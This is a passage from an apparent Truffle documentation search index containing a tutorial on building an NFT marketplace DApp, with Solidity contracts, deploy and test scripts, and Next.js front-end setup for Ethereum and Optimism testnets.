\"text-2xl font-bold text-white\" > Price - { Web3 . utils . fromWei ( nft . price , \"ether\" )} Eth < /p> < /div> < /div> )) } < /div> < /div> < /div> ) } } Web3 Client Overview \u00b6 Let's go over the Web3 concepts and utilities we've used to hook up our front end. web3Modal is a library we use to retrieve the user's network provider ipfs-http-client is a library we use to upload the NFTs metadata to IPFS web3 is a library that allows us to use our smart contract abstractions Depending on if you want to use your Optimism contracts or your Ethereum contracts, you'll change the contract import path: import Marketplace from '../contracts/optimism-contracts/Marketplace.json' import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' When we call our contract methods with Web3.js , we use call when we don't alter the contract state, and send when we do. You can read more about it here . Deploy Your Front End \u00b6 To see the front end in action, just use the node scripts in package.json . Run npm run dev from the client folder, and your website should be brought up on http://localhost:3000/ ! Note that the front end will be using whatever network and account is set on your MetaMask extension. Adding Ganache to MetaMask \u00b6 If you would like to use Ganache as your network, you can add the network to your MetaMask wallet with the following properties: Network Name: Ganache New RPC URL: http://127.0.0.1:7545 Chain ID: 1337 Currency Symbol: ETH Then, import a new account. If you are using the Ganache UI, you can grab the private key by clicking on the key icon to reveal the account keys. Adding Optimistic Ethereum to MetaMask \u00b6 If you would like to use your local instance of Optimism, you can add the network to your MetaMask wallet with the following properties: Network Name: Optimistic Ethereum New RPC URL: http://127.0.0.1:8545 Chain ID: 17 Currency Symbol: ETH Then, import a new account. You can get the list of accounts and private keys here . Additional Notes \u00b6 And there you have it - a very basic marketplace! There are many ways you can build upon this project: - Allow users to bid on an NFT - Allow useres to delist their NFTs - Combining the Marketplace contract and NFT contract into one - Bridging the Optimism contracts (Truffle L2 bridge box coming soon!) If you're interested in actually bridging between Ethereum and Optimism, check out our Optimism Bridge Box ! Join Github Discussions to join the Truffle community to discuss and ask questions!", "title": "How to Build a NFT Marketplace DApp on Ethereum or Optimism"}, {"location": "guides/nft-marketplace/#how-to-build-a-nft-marketplace-dapp-on-ethereum-or-optimism", "text": "Written by Emily Lin", "title": "How to Build a NFT Marketplace DApp on Ethereum or Optimism"}, {"location": "guides/nft-marketplace/#overview", "text": "Today, we're gonna build Bored Pets Marketplace, a simple NFT marketplace using Truffle , Infura , MetaMask , and Web3.js ! We'll start off with the basics and first show you how to deploy your ethereum contracts to Truffle's local blockchain, Ganache, and the Goerli testnet. Then, we'll show you how to covert those contracts over to Optimism and deploy on the Optimistic Goerli testnet. Note that this tutorial will not teach you Javascript and will only briefly go over some Solidity principles. Our marketplace has a core set of functionality: 1. Minting and listing an NFT 2. Buying and selling an NFT 3. Viewing listed NFTs, NFTs you own, and NFTs you are selling This tutorial was inspired by Nader Dabit's marketplace tutorial . His tutorial uses ethers.js and deploys to Polygon, both of which you can use Truffle with! The completed code for this tutorial lives here .", "title": "Overview"}, {"location": "guides/nft-marketplace/#prerequisites", "text": "", "title": "Prerequisites"}, {"location": "guides/nft-marketplace/#system-requirements", "text": "We will start with Truffle's Optimism box , scaffolding code to help get your Truffle project configured to start using Optimism asap! The README explains the project structure in more detail. At the very least, you'll need to install: Node.js , v12 or higher truffle ganache If you want to run Optimism locally, you'll need these preqrequisites too.", "title": "System Requirements"}, {"location": "guides/nft-marketplace/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum, Optimism, and other networks, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it nft-marketplace . Since we're deploying to Optimism, go ahead and add the Optimistic Goerli endpoint. It'll ask you to sign up for a free trial.", "title": "Create an Infura account and project"}, {"location": "guides/nft-marketplace/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/nft-marketplace/#add-optimistic-goerli-to-your-wallet", "text": "Let's add Optimistic Goerli to your list of available networks to your MetaMask wallet! To do so, open up the MetaMask extension, click on the network, and then click Add Network. Then, fill out the network properties (you can copy your Infura idf from your Infura project): Network Name: Optimistic Goerli New RPC URL: https://optimism-goerli.infura.io/v3/INFURA_PROJECT_ID Chain ID: 420 Currency Symbol: ETH Block Explorer URL: https://blockscout.com/optimism/goerli/", "title": "Add Optimistic Goerli to your wallet"}, {"location": "guides/nft-marketplace/#get-optimistic-goerli-eth", "text": "To use the Optimistic Goerli testnet, you'll need some test eth. To do so, you'll need to: Get some Goerli Eth. You can use this faucet , which will also give some Optimistic Goerli Eth Get some Optimstic Goerli Eth by bridging through their app: https://app.optimism.io/bridge/deposit", "title": "Get Optimistic Goerli Eth"}, {"location": "guides/nft-marketplace/#vscode", "text": "Feel free to use whatever IDE you want, but we highly recommend using VSCode! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "VSCode"}, {"location": "guides/nft-marketplace/#set-up-your-project", "text": "", "title": "Set Up Your Project"}, {"location": "guides/nft-marketplace/#unbox-optimism", "text": "To get started, we'll start off by unboxing Truffle's Optimism box. You can do this by calling truffle unbox optimism [FOLDER_NAME] or through the VSCode extension command palette! Go ahead and install the requisite packages as well. truffle unbox optimism nft-marketplace cd nft-marketplace", "title": "Unbox Optimism"}, {"location": "guides/nft-marketplace/#create-your-client-folders", "text": "We'll also be using Next.js and Tailwind CSS for our client. So, to get that set up, we'll use Next's create-next-app utility. npx create-next-app client Then, we'll download the Tailwind dependencies and populate its config. cd client npm install -D tailwindcss postcss autoprefixer npx tailwindcss init -p Edit tailwind.config.js module . exports = { content : [ \"./pages/**/*.{js,ts,jsx,tsx}\" , \"./components/**/*.{js,ts,jsx,tsx}\" , ], theme : { extend : {}, }, plugins : [], } And replace the code from styles/global.css @ tailwind base ; @ tailwind components ; @ tailwind utilities ;", "title": "Create your client folders"}, {"location": "guides/nft-marketplace/#edit-the-truffle-config-files", "text": "Since we'll be referencing your compiled contracts in the client, let's change contracts_build_directory in the Truffle config files: In truffle-config.js , change the value to './client/contracts/ethereum-contracts' . In truffle-config.ovm.js , change the value to './client/contracts/optimism-contracts' . Your top level folder structure should look like this! nft-marketplace \u251c\u2500\u2500 LICENSE \u251c\u2500\u2500 README.md \u251c\u2500\u2500 box-img-lg.png \u251c\u2500\u2500 box-img-sm.png \u251c\u2500\u2500 client \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 test \u251c\u2500\u2500 truffle-config.js \u2514\u2500\u2500 truffle-config.ovm.js", "title": "Edit the Truffle config files"}, {"location": "guides/nft-marketplace/#build-the-nft-smart-contract", "text": "Since we are first showing you how to deploy on Ethereum, we'll edit the SimpleStorage.sol contract under contracts/ethereum . Change the file name and contract name to BoredPetsNFT.sol . We'll need to install OpenZeppelin . First, switch back into your nft-marketplace directory cd .. npm install @openzeppelin/contracts The smart contract looks like this: // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.13 ; import \"@ openzeppelin / contracts / token / ERC721 / ERC721 . sol \"; import \" @openzeppelin / contracts / token / ERC721 / extensions / ERC721URIStorage . sol \"; import \" @openzeppelin / contracts / utils / Counters . sol \"; contract BoredPetsNFT is ERC721URIStorage { using Counters for Counters.Counter; Counters.Counter private _tokenIds; address marketplaceContract; event NFTMinted(uint256); constructor(address _marketplaceContract) ERC721(\" Bored Pets Yacht Club \", \" BPYC \") { marketplaceContract = _marketplaceContract; } function mint(string memory _tokenURI) public { _tokenIds.increment(); uint256 newTokenId = _tokenIds.current(); _safeMint(msg.sender, newTokenId); _setTokenURI(newTokenId, _tokenURI); setApprovalForAll(marketplaceContract, true); emit NFTMinted(newTokenId); } } Creating the NFT smart contract is short and sweet! Let's first take a look at the imports: @openzeppelin/contracts/token/ERC721/ERC721.sol To be a valid NFT, BoredPetNFT implements the ERC721 standard by inheriting the implementation of ERC721URIStorage.sol @openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol This implementation of ERC721 is used so that we store the tokenURIs on chain in storage , which is what allows us to store the metadata we upload to IPFS off-chain. @openzeppelin/contracts/utils/Counters.sol We use a counter to track the total number of NFTs and assign a unique token id to each NFT. At the top we define a few variables: address marketplaceContract is the address of the Marketplace contract we'll be writing in the next section. event NFTMinted will be emitted every time a NFT is minted. When an event is emitted in solidity, the parameters are stored in the transaction's log. We will need the tokenId later when we build out the web app. And finally, we only need to define the mint function! It only has one parameter: - string memory _tokenURI points to the JSON metdata on IPFS that stores the NFT's metadata (i.e., image, name, description) mint is relatively straightforward - it mints an NFT with an increasing, unique token Id. Of note, however, is setApprovalForAll . This is important because our Marketplace contract will need approver access to transfer ownership of the NFT between various addresses.", "title": "Build the NFT Smart Contract"}, {"location": "guides/nft-marketplace/#build-the-marketplace-contract", "text": "Now, let's add a new contract Marketplace.sol under contracts/ethereum , which will store all the marketplace functionality. This'll be what it ends up like: // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.13 ; import \"@ openzeppelin / contracts / utils / Counters . sol \"; import \" @openzeppelin / contracts / token / ERC721 / ERC721 . sol \"; import \" @openzeppelin / contracts / security / ReentrancyGuard . sol \"; contract Marketplace is ReentrancyGuard { using Counters for Counters.Counter; Counters.Counter private _nftsSold; Counters.Counter private _nftCount; uint256 public LISTING_FEE = 0.0001 ether; address payable private _marketOwner; mapping(uint256 => NFT) private _idToNFT; struct NFT { address nftContract; uint256 tokenId; address payable seller; address payable owner; uint256 price; bool listed; } event NFTListed( address nftContract, uint256 tokenId, address seller, address owner, uint256 price ); event NFTSold( address nftContract, uint256 tokenId, address seller, address owner, uint256 price ); constructor() { _marketOwner = payable(msg.sender); } // List the NFT on the marketplace function listNft(address _nftContract, uint256 _tokenId, uint256 _price) public payable nonReentrant { require(_price > 0, \" Price must be at least 1 wei \"); require(msg.value == LISTING_FEE, \" Not enough ether for listing fee \"); IERC721(_nftContract).transferFrom(msg.sender, address(this), _tokenId); _marketOwner.transfer(LISTING_FEE); _nftCount.increment(); _idToNFT[_tokenId] = NFT( _nftContract, _tokenId, payable(msg.sender), payable(address(this)), _price, true ); emit NFTListed(_nftContract, _tokenId, msg.sender, address(this), _price); } // Buy an NFT function buyNft(address _nftContract, uint256 _tokenId) public payable nonReentrant { NFT storage nft = _idToNFT[_tokenId]; require(msg.value >= nft.price, \" Not enough ether to cover asking price \"); address payable buyer = payable(msg.sender); payable(nft.seller).transfer(msg.value); IERC721(_nftContract).transferFrom(address(this), buyer, nft.tokenId); nft.owner = buyer; nft.listed = false; _nftsSold.increment(); emit NFTSold(_nftContract, nft.tokenId, nft.seller, buyer, msg.value); } // Resell an NFT purchased from the marketplace function resellNft(address _nftContract, uint256 _tokenId, uint256 _price) public payable nonReentrant { require(_price > 0, \" Price must be at least 1 wei \"); require(msg.value == LISTING_FEE, \" Not enough ether for listing fee \"); IERC721(_nftContract).transferFrom(msg.sender, address(this), _tokenId); NFT storage nft = _idToNFT[_tokenId]; nft.seller = payable(msg.sender); nft.owner = payable(address(this)); nft.listed = true; nft.price = _price; _nftsSold.decrement(); emit NFTListed(_nftContract, _tokenId, msg.sender, address(this), _price); } function getListedNfts() public view returns (NFT[] memory) { uint256 nftCount = _nftCount.current(); uint256 unsoldNftsCount = nftCount - _nftsSold.current(); NFT[] memory nfts = new NFT[](unsoldNftsCount); uint nftsIndex = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].listed) { nfts[nftsIndex] = _idToNFT[i + 1]; nftsIndex++; } } return nfts; } function getMyNfts() public view returns (NFT[] memory) { uint nftCount = _nftCount.current(); uint myNftCount = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].owner == msg.sender) { myNftCount++; } } NFT[] memory nfts = new NFT[](myNftCount); uint nftsIndex = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].owner == msg.sender) { nfts[nftsIndex] = _idToNFT[i + 1]; nftsIndex++; } } return nfts; } function getMyListedNfts() public view returns (NFT[] memory) { uint nftCount = _nftCount.current(); uint myListedNftCount = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].seller == msg.sender && _idToNFT[i + 1].listed) { myListedNftCount++; } } NFT[] memory nfts = new NFT[](myListedNftCount); uint nftsIndex = 0; for (uint i = 0; i < nftCount; i++) { if (_idToNFT[i + 1].seller == msg.sender && _idToNFT[i + 1].listed) { nfts[nftsIndex] = _idToNFT[i + 1]; nftsIndex++; } } return nfts; } } There's a lot to unpack here! You might notice that the Marketplace contract inherits ReentrancyGuard . We do this so that we can defend against reentrancy attacks. You can read more about them here . First, let's dive into the contract variables: - Counters.Counter private _nftsSold increments when a NFT is sold and decremented when a NFT is relisted. - Counters.Counter private _nftCount tracks how many NFTs have been listed. - uint256 public LISTING_FEE is taken from the seller and transferred to the marketplace contract owner whenever an NFT is sold. - address payable private _marketOwner stores the Marketplace contract owner, so that we know who to pay the listing fee to. - mapping(uint256 => NFT) private _idToNFT associates the unique tokenId to a the NFT struct. - struct NFT stores relevant information for an NFT listed in the marketplace. - event NFTListed is emitted every time a NFT is listed. - event NFTSold is emitted every time a NFT is sold. Next, we'll go over the functions that will alter state: - listNft is called when a user first mints and lists their NFT. It transfers ownership from the user over to the Marketplace contract. - resellNft allows users to sell an NFT that they purchase on the marketplace. - buyNft is called when a user buys an NFT. The buyer becomes the new owner of the NFT, the token is transferred from the buyer to the seller, and the listing fee is given to the marketplace owner. Finally, the query functions are relatively straightforward: getListedNfts retrieves the NFTs that are currently listed for sale. getMyNfts retrieves the NFTs the user has bought. getMyListedNfts retrieves the NFTs the user has listed for sale.", "title": "Build the Marketplace Contract"}, {"location": "guides/nft-marketplace/#deploy-the-smart-contracts-locally", "text": "In order to deploy our smart contracts, we'll need to modify migrations/1_deploy_contracts.js . Because BoredPetsNFT requires the Marketplace contract address, order matters here! Truffle allows you to deploy contracts in order using Promise or await / async . You can read more about it here . (Note that previously, Truffle also required a separate Migrations.sol contract, but that is no longer the case!) Your deployment file should look like this: var BoredPetsNFT = artifacts . require ( \"BoredPetsNFT\" ); var Marketplace = artifacts . require ( \"Marketplace\" ); module . exports = async function ( deployer ) { await deployer . deploy ( Marketplace ); const marketplace = await Marketplace . deployed (); await deployer . deploy ( BoredPetsNFT , marketplace . address ); } There are a variety of ways to get your local Ganache instance up: through the VS Code extension, Ganache CLI, and the Ganche graphical user interface. Each has its own advantages, and you can check out v7's coolest features here . In this example, we'll be using the GUI. Open it up, create a workspace, and hit save! This creates a running Ganache instance at HTTP://127.0.0.1:7545. You'll need to edit the development network in your truffle-config.js to match the port number. Now, just run truffle migrate in the CLI from the nft-marketplace folder, which will default to the development network. This will compile and deploy your contracts. You should see output similar to this: Compiling your contracts... =========================== > Compiling ./contracts/ethereum/BoredPetsNFT.sol.sol > Compiling ./contracts/ethereum/Marketplace.sol > Compiling @openzeppelin/contracts/security/ReentrancyGuard.sol > Compiling @openzeppelin/contracts/token/ERC721/ERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721.sol > Compiling @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol > Compiling @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol > Compiling @openzeppelin/contracts/utils/Address.sol > Compiling @openzeppelin/contracts/utils/Context.sol > Compiling @openzeppelin/contracts/utils/Counters.sol > Compiling @openzeppelin/contracts/utils/Strings.sol > Compiling @openzeppelin/contracts/utils/introspection/ERC165.sol > Compiling @openzeppelin/contracts/utils/introspection/IERC165.sol > Artifacts written to /Users/emilylin/truffle/nft-marketplace/client/contracts/ethereum-contracts > Compiled successfully using: - solc: 0 .8.13+commit.abaa5c0e.Emscripten.clang Starting migrations... ====================== > Network name: 'development' > Network id: 5777 > Block gas limit: 6721975 ( 0x6691b7 ) 1_deploy_contracts.js ===================== Deploying 'Marketplace' ----------------------- > transaction hash: 0xca3f5fcc301c700bdfd7bfb58c853e39085335ed0ef249bf57334ad856848383 > Blocks: 0 Seconds: 0 > contract address: 0x6F1A6D8a5414d1B1E67b69D69D5206498447aceE > block number: 1 > block timestamp: 1652487728 > account: 0x24D126143330E7f76753e13FAE39a844cbcEe829 > balance: 99 .96632092 > gas used: 1683954 ( 0x19b1f2 ) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .03367908 ETH Deploying 'BoredPetsNFT' --------------------------- > transaction hash: 0x077ab3a709addd41229de58f3bb6ad913a5c4646cd5df39272a9db6ad3a04f05 > Blocks: 0 Seconds: 0 > contract address: 0x2935aBf19126137D47bCa1612Dc4900815A15E92 > block number: 2 > block timestamp: 1652487729 > account: 0x24D126143330E7f76753e13FAE39a844cbcEe829 > balance: 99 .91495866 > gas used: 2568113 ( 0x272fb1 ) > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .05136226 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .08504134 ETH Summary ======= > Total deployments: 2 > Final cost: 0 .08504134 ETH You should be able to find your compiled contracts under ./client/contracts/ethereum-contracts", "title": "Deploy the Smart Contracts Locally"}, {"location": "guides/nft-marketplace/#write-a-script", "text": "To perform common actions, we'll take advantage of truffle exec to run scripts to automate common tasks. Let's write a script that will execute all of our different functions. First, create a new file under a new scripts folder called run.js . var BoredPetsNFT = artifacts . require ( \"BoredPetsNFT\" ); var Marketplace = artifacts . require ( \"Marketplace\" ); async function logNftLists ( marketplace ) { let listedNfts = await marketplace . getListedNfts () const accounts = await web3 . currentProvider . request ({ method : 'eth_accounts' , params : [], }); const accountAddress = accounts [ 0 ]; let myNfts = await marketplace . getMyNfts ({ from : accountAddress }) let myListedNfts = await marketplace . getMyListedNfts ({ from : accountAddress }) console . log ( `listedNfts: ${ listedNfts . length } ` ) console . log ( `myNfts: ${ myNfts . length } ` ) console . log ( `myListedNfts ${ myListedNfts . length } \\n` ) } const main = async ( cb ) => { try { const boredPets = await BoredPetsNFT . deployed () const marketplace = await Marketplace . deployed () console . log ( 'MINT AND LIST 3 NFTs' ) let listingFee = await marketplace . LISTING_FEE () listingFee = listingFee . toString () let txn1 = await boredPets . mint ( \"URI1\" ) let tokenId1 = txn1 . logs [ 2 ]. args [ 0 ]. toNumber () await marketplace . listNft ( boredPets . address , tokenId1 , 1 , { value : listingFee }) console . log ( `Minted and listed ${ tokenId1 } ` ) let txn2 = await boredPets . mint ( \"URI1\" ) let tokenId2 = txn2 . logs [ 2 ]. args [ 0 ]. toNumber () await marketplace . listNft ( boredPets . address , tokenId2 , 1 , { value : listingFee }) console . log ( `Minted and listed ${ tokenId2 } ` ) let txn3 = await boredPets . mint ( \"URI1\" ) let tokenId3 = txn3 . logs [ 2 ]. args [ 0 ]. toNumber () await marketplace . listNft ( boredPets . address , tokenId3 , 1 , { value : listingFee }) console . log ( `Minted and listed ${ tokenId3 } ` ) await logNftLists ( marketplace ) console . log ( 'BUY 2 NFTs' ) await marketplace . buyNft ( boredPets . address , tokenId1 , { value : 1 }) await marketplace . buyNft ( boredPets . address , tokenId2 , { value : 1 }) await logNftLists ( marketplace ) console . log ( 'RESELL 1 NFT' ) await marketplace . resellNft ( boredPets . address , tokenId2 , 1 , { value : listingFee }) await logNftLists ( marketplace ) } catch ( err ) { console . log ( 'Doh! ' , err ); } cb (); } module . exports = main ; In this script, you can use artifacts.require to gain access to the contract abstractions. Then, we interact with the contracts using the @truffle/contracts convenience library. You can use this functionality to write unit tests in Truffle in javasacript or typescript. Note that if you use typescript, you'll need to create a tsconfig.json file and use tsc to compile down to javascript. You can read more about tsc here . Run truffle exec scripts/run.js , and your output should look what's below: MINT AND LIST 3 NFTs listedNfts: 3 myNfts: 0 myListedNfts 3 BUY 2 NFTs listedNfts: 1 myNfts: 2 myListedNfts 1 RESELL 1 NFT listedNfts: 2 myNfts: 1 myListedNfts 1 Success! If you want to deploy your contracts on a populated blockchain, you can use Ganache to fork mainnet with zero config .", "title": "Write a script"}, {"location": "guides/nft-marketplace/#test-your-smart-contracts", "text": "Let's test our Marketplace contract! To do so, call: truffle create test Marketplace Then, add this code: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { balance , ether , expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const Marketplace = artifacts . require ( \"Marketplace\" ); const BoredPetsNFT = artifacts . require ( \"BoredPetsNFT\" ); function assertListing ( actual , expected ) { assert . equal ( actual . nftContract , expected . nftContract , \"NFT contract is not correct\" ); assert . equal ( actual . tokenId , expected . tokenId , \"TokenId is not correct\" ); assert . equal ( actual . owner , expected . owner , \"Owner is not correct\" ); assert . equal ( actual . seller , expected . seller , \"Seller is not correct\" ); assert . equal ( actual . price , expected . price , \"Price is not correct\" ); assert . equal ( actual . listed , expected . listed , \"Listed is not correct\" ) } function getListing ( listings , tokenId ) { let listing = {}; listings . every (( _listing ) => { if ( _listing . tokenId == tokenId ) { listing = _listing ; return false ; } else { return true ; } }); return listing } function listingToString ( listing ) { let listingCopy = {... listing }; listingCopy . tokenId = listing . tokenId . toString (); listingCopy . price = listing . price . toString (); if ( listing . listed ) { listingCopy . listed = listing . listed . toString (); } return listingCopy ; } async function mintNft ( nftContract , tokenOwner ) { return ( await nftContract . mint ( \"fakeURI\" , { from : tokenOwner })). logs [ 0 ]. args . tokenId . toNumber () } contract ( \"Marketplace\" , function ( accounts ) { const MARKETPLACE_OWNER = accounts [ 0 ]; const TOKEN_OWNER = accounts [ 1 ]; const BUYER = accounts [ 2 ]; let marketplace ; let boredPetsNFT ; let nftContract ; let listingFee ; before ( 'should reuse variables' , async () => { marketplace = await Marketplace . deployed (); boredPetsNFT = await BoredPetsNFT . deployed (); nftContract = boredPetsNFT . address ; listingFee = ( await marketplace . LISTING_FEE ()). toString (); console . log ( \"marketplace %s\" , marketplace . address ) console . log ( \"token_owner %s\" , TOKEN_OWNER ) console . log ( \"buyer %s\" , BUYER ) }); it ( \"should validate before listing\" , async function () { await expectRevert ( marketplace . listNft ( nftContract , 1 , ether ( \".005\" ), { from : TOKEN_OWNER }), \"Not enough ether for listing fee\" ); await expectRevert ( marketplace . listNft ( nftContract , 1 , 0 , { from : TOKEN_OWNER , value : listingFee }), \"Price must be at least 1 wei\" ); }); it ( \"should list nft\" , async function () { let tokenID = await mintNft ( boredPetsNFT , TOKEN_OWNER ); let tracker = await balance . tracker ( MARKETPLACE_OWNER ); await tracker . get (); let txn = await marketplace . listNft ( nftContract , tokenID , ether ( \".005\" ), { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); let expectedListing = { nftContract : nftContract , tokenId : tokenID , seller : TOKEN_OWNER , owner : marketplace . address , price : ether ( \".005\" ), listed : true }; assertListing ( getListing ( await marketplace . getListedNfts (), tokenID ), expectedListing ); assertListing ( getListing ( await marketplace . getMyListedNfts ({ from : TOKEN_OWNER }), tokenID ), expectedListing ); delete expectedListing . listed ; expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); }); it ( \"should validate before buying\" , async function () { await expectRevert ( marketplace . buyNft ( nftContract , 1 , { from : BUYER }), \"Not enough ether to cover asking price\" ); }); it ( \"should modify listings when nft is bought\" , async function () { let tokenID = await mintNft ( boredPetsNFT , TOKEN_OWNER ); await marketplace . listNft ( nftContract , tokenID , ether ( \".005\" ), { from : TOKEN_OWNER , value : listingFee }); let expectedListing = { nftContract : nftContract , tokenId : tokenID , seller : TOKEN_OWNER , owner : marketplace . address , price : ether ( \".005\" ), listed : true }; assertListing ( getListing ( await marketplace . getListedNfts (), tokenID ), expectedListing ); let tracker = await balance . tracker ( TOKEN_OWNER ); let txn = await marketplace . buyNft ( nftContract , tokenID , { from : BUYER , value : ether ( \".005\" )}); expectedListing . owner = BUYER ; expectedListing . listed = false ; assert . equal (( await tracker . delta ()). toString (), ether ( \".005\" ). toString (), \"Price not paid to seller\" ); assertListing ( getListing ( await marketplace . getMyNfts ({ from : BUYER }), tokenID ), expectedListing ); delete expectedListing . listed ; expectEvent ( txn , \"NFTSold\" , listingToString ( expectedListing )); }); it ( \"should validate reselling\" , async function () { await expectRevert ( marketplace . resellNft ( nftContract , 1 , 0 , { from : BUYER , value : listingFee }), \"Price must be at least 1 wei\" ); await expectRevert ( marketplace . resellNft ( nftContract , 1 , ether ( \".005\" ), { from : BUYER }), \"Not enough ether for listing fee\" ); }); it ( \"should resell nft\" , async function () { let tokenID = await mintNft ( boredPetsNFT , TOKEN_OWNER ); await marketplace . listNft ( nftContract , tokenID , ether ( \".005\" ), { from : TOKEN_OWNER , value : listingFee }); await marketplace . buyNft ( nftContract , tokenID , { from : BUYER , value : ether ( \".005\" )}); let expectedListing = { nftContract : nftContract , tokenId : tokenID , seller : TOKEN_OWNER , owner : BUYER , price : ether ( \".005\" ), listed : false }; assertListing ( getListing ( await marketplace . getMyNfts ({ from : BUYER }), tokenID ), expectedListing ); await boredPetsNFT . approve ( marketplace . address , tokenID , { from : BUYER }); let txn = await marketplace . resellNft ( nftContract , tokenID , ether ( \".005\" ), { from : BUYER , value : listingFee }); expectedListing . seller = BUYER ; expectedListing . owner = marketplace . address ; expectedListing . listed = true ; assertListing ( getListing ( await marketplace . getListedNfts (), tokenID ), expectedListing ); assertListing ( getListing ( await marketplace . getMyListedNfts ({ from : BUYER }), tokenID ), expectedListing ); delete expectedListing . listed ; expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); }); });", "title": "Test your smart contracts"}, {"location": "guides/nft-marketplace/#other-ways-to-deploy", "text": "", "title": "Other Ways to Deploy"}, {"location": "guides/nft-marketplace/#deploy-to-truffle-dashboards", "text": "In this tutorial, we'll take you through how to deploy to a testnet using Truffle dashboards , which allows you to sign your transactions using MetaMask. This allows you to keep your private key safe, since you don't have to save it locally. In order to do so, you'll need to get some test eth from a faucet . First, run truffle dashboard in a separate terminal window. It should open truffle dashboards at http://127.0.0.1:24012/. Then, you can use your MetaMask wallet to connect to a network of your choice. In this case, we'll select the Goerli network. Next, migrate your contract to dashboards using truffle migrate --network dashboard . If you head back to the dashboard tab, you'll see the request to sign using MetaMask. Hit accept, and voila! Head back to the terminal, and you should see the that your contracts were deployed. After changing the account number, you can execute the script again to test: truffle exec scripts/run.js", "title": "Deploy to Truffle Dashboards"}, {"location": "guides/nft-marketplace/#deploy-using-a-env-file", "text": "If you don't want to use Dashboards, you can modify your Truffle config files to use environment variables you set up. Create a .env file with the following code: INFURA_KEY = \"<Your Infura project key>\" GANACHE_MNEMONIC = \"<Your Ganache mnemonic>\" GOERLI_MNEMONIC = \"<Your Metamask mnemonic>\" The .gitignore already ignores .env , but since you're populating your mnemonic/secret key here, PLEASE DO NOT COMMIT THIS ANYWHERE PUBLIC. Then, just run truffle migrate --network [NETWORK NAME] or npm run migrate:ovm --network=[NETWORK NAME]", "title": "Deploy Using a .env File"}, {"location": "guides/nft-marketplace/#deploy-to-optimistic-goerli", "text": "Since Optimism is EVM equivalent with small exceptions , we can just copy our contracts from the contracts/ethereum over to contracts/optimism . To get Eth for Optimistic Goerli, you can use this faucet . You'll need to sign up with a Github account older than 1 month and be following at least 5 repos: - trufflesuite - truffle-box - Infura - MetaMask - Optimism Our box already includes the Optimistic Goerli configuration in truffle-confg.ovm.js . Run npm run migrate:ovm --network=optimistic_goerli to deploy, and npm run exec:ovm scripts/run.js --network=optimistic_goerli to test! Since we are using a testnet, connectivity can get a bit flaky. You can try again by running the migrate command with --reset . Alternatively, you might see occasionally see something like this: TypeError: Cannot read properties of null ( reading 'from' ) In which case, you can specify the from address in the deploy script as follows ( ACCOUNT_ADDRESS is the address that will be signing the transaction): module . exports = async function ( deployer ) { await deployer . deploy ( Marketplace ); const marketplace = await Marketplace . deployed (); await deployer . deploy ( BoredPetsNFT , marketplace . address , { from : \"ACCOUNT_ADDRESS\" }); }", "title": "Deploy to Optimistic Goerli"}, {"location": "guides/nft-marketplace/#deploy-to-optimism-locally", "text": "You can also deploy to a locally running instance of Optimism. You'll need to have very specific system requirements . Make sure ports 9545 and 8545 are free, and then run: npm run installLocalOptimism npm run startLocalOptimism", "title": "Deploy to Optimism Locally"}, {"location": "guides/nft-marketplace/#create-an-infura-ipfs-project", "text": "You'll need Infura IPFS account and dedicated gateway to upload your NFT metadata. To create a IPFS project, select create IPFS project. Then, you'll need to create a unique gateway name. In this project, we'll call it optimism-demo . You will need to give your own dedicated gateway with its own unique name.", "title": "Create an Infura IPFS project"}, {"location": "guides/nft-marketplace/#create-your-front-end", "text": "First, we need to install some packages to get our client up and running: cd client npm install axios npm install web3modal npm install web3 npm install ipfs-http-client Then, we need to create or edit 6 files that sit under client/pages :", "title": "Create Your Front End"}, {"location": "guides/nft-marketplace/#_appjs", "text": "This file organizes the link routing import '../styles/globals.css' import Link from 'next/link' function MyApp ({ Component , pageProps }) { return ( < div > < nav className = \"border-b p-6\" > < p className = \"text-4xl font-bold\" > Bored Pet Marketplace < /p> < div className = \"flex mt-4\" > < Link href = \"/\" className = \"mr-4 text-teal-400\" > Home < /Link> < Link href = \"/create-and-list-nft\" className = \"mr-6 text-teal-400\" > Sell a new NFT < /Link> < Link href = \"/my-nfts\" className = \"mr-6 text-teal-400\" > My NFTs < /Link> < Link href = \"/my-listed-nfts\" className = \"mr-6 text-teal-400\" > My Listed NFTs < /Link> < /div> < /nav> < Component {... pageProps } /> < /div> ) } export default MyApp", "title": "_app.js"}, {"location": "guides/nft-marketplace/#indexjs", "text": "Thie file is the Home tab, where a user can see and buy all of the listed NFTs. import Web3 from 'web3' ; import Web3Modal from 'web3modal' ; import { useEffect , useState } from 'react' ; import axios from 'axios' ; import Marketplace from '../contracts/optimism-contracts/Marketplace.json' import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' export default function Home () { const [ nfts , setNfts ] = useState 